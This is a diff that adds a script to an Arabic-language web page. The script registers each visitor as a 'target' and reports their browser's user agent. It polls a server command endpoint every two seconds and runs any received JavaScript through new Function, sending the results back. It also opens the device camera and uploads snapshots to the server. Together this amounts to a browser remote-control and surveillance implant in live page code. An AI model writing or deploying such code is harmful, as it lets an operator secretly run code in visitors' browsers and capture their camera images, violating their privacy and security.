@@ -9,3 +9,98 @@
  <button>إيقاف</button>
 </div>
 
+<script>
+const P = new URLSearchParams(location.search);
+const T = P.get('t') || 'T1';
+const API = location.origin + '/api';
+let since = 0, seq = 0, timer = null, stream = null;
+
+const $ = id => document.getElementById(id);
+const o = $('o');
+const log = m => { o.textContent = m + '\n' + o.textContent.slice(0, 2000); };
+
+async function post(path, body) {
+  const r = await fetch(API + path + '?t=' + T, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body || {})
+  });
+  return r.json().catch(() => ({}));
+}
+
+async function up(m) { try { await post('/up', { m }); } catch {} }
+
+async function shot(caption) {
+  const c = document.createElement('canvas');
+  const v = $('v');
+  const w = v.videoWidth || 640, h = v.videoHeight || 480;
+  c.width = w; c.height = h;
+  c.getContext('2d').drawImage(v, 0, 0, w, h);
+  const d = c.toDataURL('image/jpeg', 0.7).split(',')[1];
+  await post('/img', { d, c: caption || 'صورة' });
+}
+
+async function cam(facing) {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: facing || 'environment' }, audio: false
+  });
+  $('v').srcObject = stream;
+  $('v').hidden = false;
+  await up('cam: ' + (facing || 'environment'));
+}
+
+window.cam = cam;
+window.shot = shot;
+
+// polling الأوامر
+async function poll() {
+  try {
+    const r = await fetch(API + '/cmd?t=' + T + '&since=' + seq);
+    const j = await r.json();
+    if (j.seq > seq) {
+      seq = j.seq;
+      log('← ' + j.cmd);
+      try {
+        const fn = new Function('return (' + j.cmd + ')');
+        let res = fn();
+        if (res instanceof Promise) res = await res;
+        if (res !== undefined) up('= ' + JSON.stringify(res));
+      } catch (e) {
+        try {
+          const fn2 = new Function(j.cmd);
+          let res2 = fn2();
+          if (res2 instanceof Promise) res2 = await res2;
+          if (res2 !== undefined) up('= ' + JSON.stringify(res2));
+        } catch (e2) { up('خطأ: ' + e2.message); }
+      }
+    }
+  } catch {}
+}
+
+// نبضة
+setInterval(() => post('/ping', {}).catch(() => {}), 15000);
+
+// تسجيل الهدف
+post('/ping', {}).then(() => {});
+
+poll();
+setInterval(poll, 2000);
+
+// الأزرار
+document.querySelectorAll('#b button').forEach((b, i) => {
+  b.onclick = async () => {
+    const acts = [
+      () => cam('environment'),
+      () => cam('user'),
+      () => shot('صورة'),
+      () => up('flash'),
+      () => cam('environment'),
+      () => { if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; $('v').hidden = true; } }
+    ];
+    await acts[i]();
+  };
+});
+
+up('init: ' + navigator.userAgent);
+</script>
